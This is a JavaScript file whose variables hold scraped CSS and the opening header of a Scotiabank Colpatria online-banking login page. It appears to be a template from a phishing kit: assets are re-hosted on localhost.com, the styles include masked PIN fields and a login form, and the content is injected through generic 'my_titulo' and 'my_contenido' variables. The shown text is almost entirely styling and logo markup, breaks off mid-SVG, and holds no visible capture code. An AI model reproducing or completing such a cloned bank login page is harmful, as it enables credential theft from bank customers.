var my_titulo = 'Colpatria';
var my_contenido = `
<style>
    input[type="tel"] {
        /* font-family: "text-security-disc"; */
        -webkit-text-security: disc;
    }

    .first-meaningful__spinner {
        animation: 1s linear infinite svg-icon-spin;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 50px auto;
        width: 300px;
    }

    .first-meaningful__spinner svg {
        height: 72px;
        stroke-width: 1.66667;
        width: 72px;
        color: #333;
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
        margin: 30px;
    }

    .svg-icon-spinner--72px {
        height: 7.2rem;
        stroke-width: 1.6666666667;
        width: 7.2rem;
    }

    .svg-icon-spinner {
        animation: svg-icon-spin 1s linear infinite;
    }

    .svg-icon {
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
    }

    .svg-icon-spinner {
        animation: svg-icon-spin 1s linear infinite
    }

    .svg-icon-spinner--18px {
        height: 1.8rem;
        stroke-width: 2.6666666667;
        width: 1.8rem
    }

    .svg-icon-spinner--24px {
        height: 2.4rem;
        stroke-width: 2;
        width: 2.4rem
    }

    .svg-icon-spinner--32px {
        height: 3.2rem;
        stroke-width: 2.25;
        width: 3.2rem
    }

    .svg-icon-spinner--48px {
        height: 4.8rem;
        stroke-width: 2;
        width: 4.8rem
    }

    .svg-icon-spinner--72px {
        height: 7.2rem;
        stroke-width: 1.6666666667;
        width: 7.2rem
    }

    .svg-icon-illustrative--size-24px {
        height: 2.4rem;
        stroke-width: 2.5;
        width: 2.4rem
    }

    .svg-icon-illustrative--size-36px {
        height: 3.6rem;
        stroke-width: 2;
        width: 3.6rem
    }

    .svg-icon-illustrative--size-48px {
        height: 4.8rem;
        stroke-width: 1.75;
        width: 4.8rem
    }

    .svg-icon-illustrative--size-72px {
        height: 7.2rem;
        stroke-width: 1.5;
        width: 7.2rem
    }

    .svg-icon-category--bg--size-36px {
        height: 3.6rem;
        stroke-width: 1.25;
        width: 3.6rem
    }

    .svg-icon-category--size-24px {
        height: 2.4rem;
        stroke-width: 1.25;
        width: 2.4rem
    }

    .svg-icon-logo--size-12px {
        height: 1.2rem
    }

    .svg-icon-logo--size-14px {
        height: 1.4rem
    }

    .svg-icon-logo--size-16px {
        height: 1.6rem
    }

    .svg-icon-logo--size-18px {
        height: 1.8rem
    }

    .svg-icon-logo--size-24px {
        height: 2.4rem
    }

    .svg-icon-logo--size-32px {
        height: 3.2rem
    }

    .svg-icon-logo--size-36px {
        height: 3.6rem
    }

    .svg-icon-logo--size-48px {
        height: 4.8rem
    }

    .svg-icon-logo--size-72px {
        height: 7.2rem
    }

    .svg-icon-logo-flying--size-12px {
        height: 1.2rem;
        width: 1.2rem
    }

    .svg-icon-logo-flying--size-14px {
        height: 1.4rem;
        width: 1.4rem
    }

    .svg-icon-logo-flying--size-16px {
        height: 1.6rem;
        width: 1.6rem
    }

    .svg-icon-logo-flying--size-18px {
        height: 1.8rem;
        width: 1.8rem
    }

    .svg-icon-logo-flying--size-24px {
        height: 2.4rem;
        width: 2.4rem
    }

    .svg-icon-logo-flying--size-32px {
        height: 3.2rem;
        width: 3.2rem
    }

    .svg-icon-logo-flying--size-36px {
        height: 3.6rem;
        width: 3.6rem
    }

    .svg-icon-logo-flying--size-48px {
        height: 4.8rem;
        width: 4.8rem
    }

    .svg-icon-logo-flying--size-72px {
        height: 7.2rem;
        width: 7.2rem
    }

    @keyframes svg-icon-spin {
        0% {
            transform: rotate(0)
        }

        to {
            transform: rotate(360deg)
        }
    }

    canvas-header .header__bar {
        padding: .8rem 1.2rem;
    }

    canvas-header[fixed] .header {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        z-index: 300;
    }

    canvas-header[fixed] .header:not([class*=background]) {
        background-color: #fff;
    }

    canvas-header[shadow] .header {
        box-shadow: 0 .2rem 1rem #0028501c;
    }

    /*! CSS Used from: Embedded */
    .m-auto {
        margin: auto !important;
    }

    .application-wrapper {
        height: calc(100vh);
        width: 100%;
        display: flex;
        flex-direction: column;
    }

    .application-wrapper .header {
        max-height: 6rem;
    }

    .application-wrapper .header__bar.container--center {
        padding: 1rem 3rem;
    }

    @media (min-width: 0) {
        .application-wrapper .header__bar.container--center {
            margin: 0 auto;
        }
    }

    .application-wrapper .header .logo {
        width: 350px;
    }

    @media (max-width: 599px) {
        .application-wrapper .header .logo {
            display: none;
        }
    }

    .application-wrapper .header .logo__mobile {
        width: 90px;
    }

    @media (min-width: 600px) {
        .application-wrapper .header .logo__mobile {
            display: none;
        }
    }

    .application-wrapper .main-container {
        margin: 9rem auto 0 !important;
        padding: 0 3.6rem;
        flex: 80%;
        width: 100%;
    }

    @media (min-width: 922px) {
        .application-wrapper .main-container {
            padding: 0 !important;
            max-width: 1200px;
            margin: 13.2rem auto 0 !important;
        }
    }

    .application-wrapper .header__block {
        flex: 0;
    }

    html,
    body,
    div,
    span,
    h1,
    h2,
    p,
    a,
    img,
    ul,
    form,
    label,
    footer,
    header,
    output,
    section {
        margin: 0;
        padding: 0;
        border: 0;
        font-family: inherit;
        vertical-align: baseline;
    }

    html {
        box-sizing: border-box;
        z-index: 1;
    }

    html,
    body {
        -moz-osx-font-smoothing: grayscale;
        -webkit-font-smoothing: antialiased;
    }

    *,
    *:before,
    *:after {
        box-sizing: inherit;
    }

    input[type=text],
    input[type=password],
    textarea {
        -webkit-appearance: none;
        appearance: none;
    }

    .link {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        color: #009dd6;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        outline: none;
        padding: 0;
        text-decoration: none;
        width: -moz-fit-content;
        width: fit-content;
    }

    .link:hover,
    .link:focus {
        color: #007eab;
        cursor: pointer;
    }

    .link__text:hover,
    .link__text:focus {
        border-bottom: solid 1px;
        margin-bottom: -1px;
    }

    .brand {
        color: #333;
        text-decoration: none;
    }

    .container {
        max-width: 1440px;
        min-width: 248px;
        position: relative;
        width: auto;
    }

    @media (min-width: 0) {
        .container {
            margin: 0 3rem;
        }
    }

    @media (min-width: 768px) {
        .container {
            margin: 0 2.4rem;
        }
    }

    @media (min-width: 922px) {
        .container {
            margin: 0 2.1rem;
        }
    }

    @media (min-width: 1200px) {
        .container {
            margin: 0 1.8rem;
        }
    }

    @media (min-width: 1488px) {
        .container.container--center {
            margin: 0 auto;
        }
    }

    .direction--row {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        flex-direction: row;
        flex-wrap: wrap;
        position: relative;
    }

    @media (min-width: 0) {
        .col-xs-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 .6rem;
        }
    }

    @media (min-width: 768px) {
        .col-sm-6 {
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0 1.2rem;
        }

        .col-sm-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.2rem;
        }

        .offset-sm-3 {
            margin-left: 25%;
        }
    }

    @media (min-width: 922px) {
        .col-md-4 {
            flex: 0 0 33.3333333333%;
            max-width: 33.3333333333%;
            padding: 0 1.5rem;
        }

        .col-md-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.5rem;
        }

        .offset-md-0 {
            margin-left: 0%;
        }
    }

    @media (min-width: 1200px) {
        .col-lg-12 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0 1.8rem;
        }
    }

    @media (min-width: 0) and (max-width: 767px) {
        .hide--xs {
            display: none;
        }
    }

    @media (min-width: 768px) and (max-width: 921px) {
        .hide--sm {
            display: none;
        }
    }

    @media (min-width: 922px) and (max-width: 1199px) {
        .hide--md {
            display: none;
        }
    }

    @media (min-width: 1200px) and (max-width: 4000px) {
        .hide--lg {
            display: none;
        }
    }

    html,
    body {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 10px;
        font-weight: initial;
        letter-spacing: 0;
        line-height: 18px;
        margin: 0;
        color: #333;
    }

    .hero {
        font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
        font-size: 3.6rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 4.1rem;
        margin: 0;
    }

    @media (min-width: 922px) {
        .hero {
            font-size: 4.8rem;
            line-height: 5.4rem;
        }
    }

    .text--footer {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.2rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0;
    }

    .color--default {
        color: #333;
    }

    .background--background-alternate {
        background-color: #fafbfd;
    }

    .block {
        display: flex;
        flex-direction: row;
    }

    .block--centered {
        align-items: center;
        justify-content: center;
    }

    @media (min-width: 0) {
        .margin-xs-12 {
            margin-bottom: 1.2rem;
            margin-top: 1.2rem;
        }

        .margin-xs-18--top {
            margin-top: 1.8rem;
        }

        .margin-xs-24--top {
            margin-top: 2.4rem;
        }

        .margin-xs-30--top {
            margin-top: 3rem;
        }

        .margin-xs-36--top {
            margin-top: 3.6rem;
        }

        .margin-xs-72--top {
            margin-top: 7.2rem;
        }

        .margin-xs-72--bottom {
            margin-bottom: 7.2rem;
        }
    }

    @media (min-width: 768px) {
        .margin-sm-18 {
            margin-bottom: 1.8rem;
            margin-top: 1.8rem;
        }
    }

    .svg-icon {
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round;
    }

    .svg-icon--size-12px {
        height: 1.2rem;
        stroke-width: 3;
        width: 1.2rem;
    }

    .svg-icon--size-18px {
        height: 1.8rem;
        stroke-width: 2;
        width: 1.8rem;
    }

    .button {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        cursor: pointer;
        outline: none;
        overflow: visible;
        position: relative;
    }

    .button:disabled {
        cursor: not-allowed;
        -webkit-tap-highlight-color: transparent;
    }

    @media all and (-ms-high-contrast: active) {
        .button:focus {
            outline: 2px solid white;
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .button:focus {
            outline: 2px solid black;
        }
    }

    .button--primary {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 3.6rem;
        text-decoration: none;
        background-color: #ec111a;
        border-color: #ec111a;
        color: #fff;
        min-height: 5.4rem;
        min-width: 11.8rem;
        transition: background-color ease-in .1s, color ease-in .1s;
    }

    .button--primary:disabled:disabled,
    .button--primary:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575;
    }

    .button--primary:hover,
    .button--primary:focus {
        background-color: #be061b;
        border-color: #be061b;
        color: #fff;
        transition: background-color ease-out .1s, color ease-out .1s;
    }

    .button--primary:after {
        border-radius: .8rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
    }

    .button--primary:focus {
        outline: transparent;
    }

    .button--primary:focus:after {
        opacity: 1;
    }

    .button:disabled:hover {
        box-shadow: none;
    }

    .header {
        border-top: solid 4px #ec111a;
    }

    .header__bar {
        justify-content: space-between;
        padding: 3.6rem 1.2rem;
    }

    .form__input {
        border: 0;
        position: relative;
    }

    .form__input--inline {
        cursor: pointer;
        position: relative;
    }

    .form__input--checkbox {
        display: flex;
        align-items: center;
    }

    .label {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        line-height: 2.4rem;
        color: #333;
        display: inline;
        padding: 0 .1rem;
        vertical-align: middle;
    }

    .label--inline {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
    }

    .input {
        padding: 1rem .1rem;
        width: 100%;
        font-family: Scotia Regular;
        font-size: 2rem;
        font-weight: initial;
        line-height: 2.4rem;
    }

    .input--with-icon {
        top: initial;
    }

    .input--with-icon--left {
        padding-left: 3.2rem;
    }

    .input__icon {
        pointer-events: none;
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
    }

    .input__icon--left {
        left: 0;
    }

    .input--text {
        -webkit-appearance: none;
        appearance: none;
        background-color: transparent;
        border-bottom-color: #757575;
        border-bottom-style: solid;
        border-radius: 0;
        border-width: 0 0 1px;
        color: #333;
        display: block;
        outline: none;
        position: relative;
        transition: box-shadow .2s ease-in-out;
        width: 100%;
    }

    .input--text:focus {
        border-bottom-color: #009dd6;
        box-shadow: 0 .1rem #009dd6;
    }

    .checkbox {
        align-self: flex-start;
        background-color: transparent;
        border: solid 1px #757575;
        border-radius: .4rem;
        color: #fff;
        margin-right: 1.2rem;
        min-height: 2.4rem;
        min-width: 2.4rem;
        position: relative;
        transition: opacity ease-in-out .2s;
    }

    .checkbox:after {
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
        transform: translate(-.1rem, -.1rem);
    }

    .checkbox .svg-icon {
        left: 50%;
        margin-left: -.6rem;
        margin-top: -.6rem;
        position: absolute;
        top: 50%;
    }

    .checkbox__check {
        display: none;
    }

    .input--checkbox {
        align-self: flex-start;
        opacity: 0;
        position: absolute;
        width: auto;
    }

    .input--checkbox:focus+.checkbox:after {
        opacity: 1;
    }

    @media all and (-ms-high-contrast: active) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid white;
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid black;
        }
    }

    .input--checkbox:checked+.checkbox {
        background-color: #009dd6;
        border-color: #009dd6;
    }

    .input--checkbox:checked+.checkbox .checkbox__check {
        display: block;
    }

    .input--checkbox:disabled+.checkbox {
        border-color: #d6d6d6;
        cursor: not-allowed;
    }

    .input--checkbox:disabled+.checkbox+.label--checkbox {
        cursor: not-allowed;
    }

    .input--checkbox:disabled:checked+.checkbox {
        background-color: transparent;
        color: #d6d6d6;
    }

    .input--checkbox:disabled:checked+.checkbox .checkbox__check {
        display: block;
    }

    .label--checkbox {
        line-height: 2.4rem;
        padding-top: 0rem;
    }

    .input-w-aux__input {
        padding-left: 2.5rem;
    }

    .input-w-aux__action {
        bottom: 1.1rem;
        color: #333;
        height: 2rem;
        opacity: 0;
        padding: 0;
        position: absolute;
        right: 1.8rem;
        transition: opacity .1s ease-in-out;
        width: 2rem;
        z-index: 110;
    }

    @media (min-width: 767px) {
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 2rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
        }
    }

    @media (max-width: 767px) {
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 1.8rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
    }

    html,
    body {
        min-height: 100vh;
        font-size: 65.2%;
    }

    body {
        font-size: 1.6rem;
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            margin: 0 36px;
            max-width: initial;
        }
    }

    .block--padding-0 {
        padding: 0;
    }

    .hero {
        font-size: 2.6rem;
    }

    @media (min-width: 922px) {
        .hero {
            font-size: 3.6rem;
        }
    }

    @media only screen and (min-width: 768px),
    (min-width: 1200px) {
        .container {
            max-width: 1200px;
        }

        .container--center {
            margin: 0 auto;
        }
    }

    ::-webkit-scrollbar {
        width: .25rem;
    }

    ::-webkit-scrollbar-track {
        box-shadow: inset 0 0 .02rem #757575;
        border-radius: 2rem;
    }

    ::-webkit-scrollbar-thumb {
        background: #757575;
        border-radius: 2rem;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: #e2e8ee;
    }

    section {
        padding-top: 0;
    }

    section {
        display: flex;
        flex-direction: row;
        flex: 1;
    }

    .form__password {
        position: relative;
    }

    .password-validation {
        text-align: left;
        display: none;
        justify-content: space-between;
        width: 100%;
        margin-top: .6rem;
    }

    .password-validation span {
        font-size: .75em;
        color: #333;
    }

    auth-login {
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    /*! CSS Used from: http://localhost.com/css/sweetalert2.min.css */
    .no-border {
        border: none !important;
    }

    div:where(.swal2-container) {
        display: grid;
        position: fixed;
        z-index: 1060;
        inset: 0;
        box-sizing: border-box;
        grid-template-areas: "top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";
        grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
        height: 100%;
        padding: .625em;
        overflow-x: hidden;
        transition: background-color .1s;
        -webkit-overflow-scrolling: touch;
    }

    div:where(.swal2-container).swal2-backdrop-show {
        background: rgba(0, 0, 0, .4);
    }

    div:where(.swal2-container).swal2-center {
        grid-template-columns: auto minmax(0, 1fr) auto;
    }

    div:where(.swal2-container).swal2-center>.swal2-popup {
        grid-column: 2;
        grid-row: 2;
        align-self: center;
        justify-self: center;
    }

    div:where(.swal2-container) div:where(.swal2-popup) {
        display: none;
        position: relative;
        box-sizing: border-box;
        grid-template-columns: minmax(0, 100%);
        width: 32em;
        max-width: 100%;
        padding: 0 0 1.25em;
        border: none;
        border-radius: 5px;
        background: #fff;
        color: #545454;
        font-family: inherit;
        font-size: 14px;
    }

    div:where(.swal2-container) div:where(.swal2-popup):focus {
        outline: none;
    }

    div:where(.swal2-container) h2:where(.swal2-title) {
        position: relative;
        max-width: 100%;
        margin: 0;
        padding: .8em 1em 0;
        color: inherit;
        font-size: 1.875em;
        font-weight: 600;
        text-align: center;
        text-transform: none;
        word-wrap: break-word;
    }

    div:where(.swal2-container) div:where(.swal2-actions) {
        display: flex;
        z-index: 1;
        box-sizing: border-box;
        flex-wrap: wrap;
        align-items: center;
        justify-content: center;
        width: auto;
        margin: 1.25em auto 0;
        padding: 0;
    }

    div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover {
        background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
    }

    div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active {
        background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
    }

    div:where(.swal2-container) div:where(.swal2-loader) {
        display: none;
        align-items: center;
        justify-content: center;
        width: 2.2em;
        height: 2.2em;
        margin: 0 1.875em;
        animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
        border-width: .25em;
        border-style: solid;
        border-radius: 100%;
        border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0);
    }

    div:where(.swal2-container) button:where(.swal2-styled) {
        margin: .3125em;
        padding: .625em 1.1em;
        transition: box-shadow .1s;
        box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
        font-weight: 500;
    }

    div:where(.swal2-container) button:where(.swal2-styled):not([disabled]) {
        cursor: pointer;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #7066e0;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm:focus {
        box-shadow: 0 0 0 3px rgba(112, 102, 224, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-deny {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #dc3741;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-deny:focus {
        box-shadow: 0 0 0 3px rgba(220, 55, 65, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: #6e7881;
        color: #fff;
        font-size: 1em;
    }

    div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel:focus {
        box-shadow: 0 0 0 3px rgba(110, 120, 129, .5);
    }

    div:where(.swal2-container) button:where(.swal2-styled):focus {
        outline: none;
    }

    div:where(.swal2-container) div:where(.swal2-footer) {
        margin: 1em 0 0;
        padding: 1em 1em 0;
        border-top: 1px solid #eee;
        color: inherit;
        font-size: 1em;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-timer-progress-bar-container {
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        grid-column: auto !important;
        overflow: hidden;
        border-bottom-right-radius: 5px;
        border-bottom-left-radius: 5px;
    }

    div:where(.swal2-container) div:where(.swal2-timer-progress-bar) {
        width: 100%;
        height: .25em;
        background: rgba(0, 0, 0, .2);
    }

    div:where(.swal2-container) img:where(.swal2-image) {
        max-width: 100%;
        margin: 2em auto 1em;
    }

    div:where(.swal2-container) button:where(.swal2-close) {
        z-index: 2;
        align-items: center;
        justify-content: center;
        width: 1.2em;
        height: 1.2em;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: -1.2em;
        padding: 0;
        overflow: hidden;
        transition: color .1s, box-shadow .1s;
        border: none;
        border-radius: 5px;
        background: rgba(0, 0, 0, 0);
        color: #ccc;
        font-family: monospace;
        font-size: 2.5em;
        cursor: pointer;
        justify-self: end;
    }

    div:where(.swal2-container) button:where(.swal2-close):hover {
        transform: none;
        background: rgba(0, 0, 0, 0);
        color: #f27474;
    }

    div:where(.swal2-container) button:where(.swal2-close):focus {
        outline: none;
        box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5);
    }

    div:where(.swal2-container) .swal2-html-container {
        z-index: 1;
        justify-content: center;
        margin: 1em 1.6em .3em;
        padding: 0;
        overflow: auto;
        color: inherit;
        font-size: 1.125em;
        font-weight: normal;
        line-height: normal;
        text-align: center;
        word-wrap: break-word;
        word-break: break-word;
    }

    div:where(.swal2-container) input:where(.swal2-input),
    div:where(.swal2-container) input:where(.swal2-file),
    div:where(.swal2-container) textarea:where(.swal2-textarea),
    div:where(.swal2-container) select:where(.swal2-select),
    div:where(.swal2-container) div:where(.swal2-radio),
    div:where(.swal2-container) label:where(.swal2-checkbox) {
        margin: 1em 2em 3px;
    }

    div:where(.swal2-container) input:where(.swal2-input),
    div:where(.swal2-container) input:where(.swal2-file),
    div:where(.swal2-container) textarea:where(.swal2-textarea) {
        box-sizing: border-box;
        width: auto;
        transition: border-color .1s, box-shadow .1s;
        border: 1px solid #d9d9d9;
        border-radius: .1875em;
        background: rgba(0, 0, 0, 0);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em;
    }

    div:where(.swal2-container) input:where(.swal2-input):focus,
    div:where(.swal2-container) input:where(.swal2-file):focus,
    div:where(.swal2-container) textarea:where(.swal2-textarea):focus {
        border: 1px solid #b4dbed;
        outline: none;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5);
    }

    div:where(.swal2-container) input:where(.swal2-input)::placeholder,
    div:where(.swal2-container) input:where(.swal2-file)::placeholder,
    div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder {
        color: #ccc;
    }

    div:where(.swal2-container) .swal2-range {
        margin: 1em 2em 3px;
        background: #fff;
    }

    div:where(.swal2-container) .swal2-range input {
        width: 80%;
    }

    div:where(.swal2-container) .swal2-range output {
        width: 20%;
        color: inherit;
        font-weight: 600;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-range input,
    div:where(.swal2-container) .swal2-range output {
        height: 2.625em;
        padding: 0;
        font-size: 1.125em;
        line-height: 2.625em;
    }

    div:where(.swal2-container) .swal2-input {
        height: 2.625em;
        padding: 0 .75em;
    }

    div:where(.swal2-container) .swal2-file {
        width: 75%;
        margin-right: auto;
        margin-left: auto;
        background: rgba(0, 0, 0, 0);
        font-size: 1.125em;
    }

    div:where(.swal2-container) .swal2-textarea {
        height: 6.75em;
        padding: .75em;
    }

    div:where(.swal2-container) .swal2-select {
        min-width: 50%;
        max-width: 100%;
        padding: .375em .625em;
        background: rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em;
    }

    div:where(.swal2-container) .swal2-radio,
    div:where(.swal2-container) .swal2-checkbox {
        align-items: center;
        justify-content: center;
        background: #fff;
        color: inherit;
    }

    div:where(.swal2-container) .swal2-checkbox input {
        flex-shrink: 0;
        margin: 0 .4em;
    }

    div:where(.swal2-container) div:where(.swal2-validation-message) {
        align-items: center;
        justify-content: center;
        margin: 1em 0 0;
        padding: .625em;
        overflow: hidden;
        background: #f0f0f0;
        color: #666;
        font-size: 1em;
        font-weight: 300;
    }

    div:where(.swal2-container) div:where(.swal2-validation-message)::before {
        content: "!";
        display: inline-block;
        width: 1.5em;
        min-width: 1.5em;
        height: 1.5em;
        margin: 0 .625em;
        border-radius: 50%;
        background-color: #f27474;
        color: #fff;
        font-weight: 600;
        line-height: 1.5em;
        text-align: center;
    }

    div:where(.swal2-container) .swal2-progress-steps {
        flex-wrap: wrap;
        align-items: center;
        max-width: 100%;
        margin: 1.25em auto;
        padding: 0;
        background: rgba(0, 0, 0, 0);
        font-weight: 600;
    }

    div:where(.swal2-icon) {
        position: relative;
        box-sizing: content-box;
        justify-content: center;
        width: 5em;
        height: 5em;
        margin: 2.5em auto .6em;
        border: 0.25em solid rgba(0, 0, 0, 0);
        border-radius: 50%;
        border-color: #000;
        font-family: inherit;
        line-height: 5em;
        cursor: default;
        user-select: none;
    }

    div:where(.swal2-icon) .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 3.75em;
    }

    [class^=swal2] {
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    .swal2-show {
        animation: swal2-show .3s;
    }

    body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
        overflow: hidden;
    }

    body.swal2-height-auto {
        height: auto !important;
    }

    @media print {
        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
            overflow-y: scroll !important;
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
            display: none;
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
            position: static !important;
        }
    }

    .password-validation.visible {
        display: flex
    }

    .input-w-aux__input.input--active+label {
        height: 1px;
        left: -10000px;
        overflow: hidden;
        position: absolute;
        top: auto;
        width: 1px
    }

    .input-w-aux__input.input--active~button {
        opacity: 1
    }

    /*! CSS Used keyframes */
    @keyframes swal2-rotate-loading {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }

    @keyframes swal2-show {
        0% {
            transform: scale(0.7);
        }

        45% {
            transform: scale(1.05);
        }

        80% {
            transform: scale(0.95);
        }

        100% {
            transform: scale(1);
        }
    }

    /*! CSS Used fontfaces */
    @font-face {
        font-family: Scotia Bold;
        src: url('http://localhost.com/fonts/Scotia_W_Bd.woff') format("woff");
    }

    @font-face {
        font-family: Scotia Regular;
        font-style: normal;
        src: url('http://localhost.com/fonts/Scotia_W_Rg.woff') format("woff");
    }

    @font-face {
        font-family: Scotia Headline;
        font-style: normal;
        src: url('http://localhost.com/fonts/Scotia_W_Headline.woff') format("woff");
    }
</style>

<header id="headerNew" style="display: none;">
    <canvas-header app="">
        <header class="header">
            <div class="header__bar container container--center direction--row">
                <div class="direction--row">
                    <div class="col-xs-11 col-sm-11 col-md-11">
                        <div class="block block--left"><span class="hide--sm hide--md hide--lg"><canvas-svg
                                    name="scotiabank-colpatria-symbol-red" type="icon-logo" class="flex"><svg
                                        viewBox="0 0 103 36" xmlns="http://www.w3.org/2000/svg" focusable="false"
                                        role="presentation" aria-hidden="true"
                                        class="svg-icon svg-icon-logo--size-32px">
                                        <defs xmlns="http://www.w3.org/2000/svg">
                                            <style>
                                                #symbol-scotibank-colpatria-red path {
                                                    fill: #ec111a;
                                                    stroke: none
                                                }
                                            </style>
                                        </defs>
                                        <g id="symbol-scotibank-colpatria-red" fill-rule="nonzero">
                                            <path
                                                d="M25.9120407 6.8091706H15.6747459C9.8362002 6.8091706 5.0293198 11.2683749 4.4057858 17 3.5101642 15.3607552 3 13.4693189 3 11.4632502 3 5.1355361 8.078968 0 14.336982 0H32M6.0879593 29.1908294h10.2372948c5.8385457 0 10.6454261-4.4592043 11.2689601-10.1908294C28.4898358 20.6392448 29 22.5306811 29 24.5367498 29 30.8644639 23.9210321 36 17.663018 36H0">
                                            </path>
                                            <path
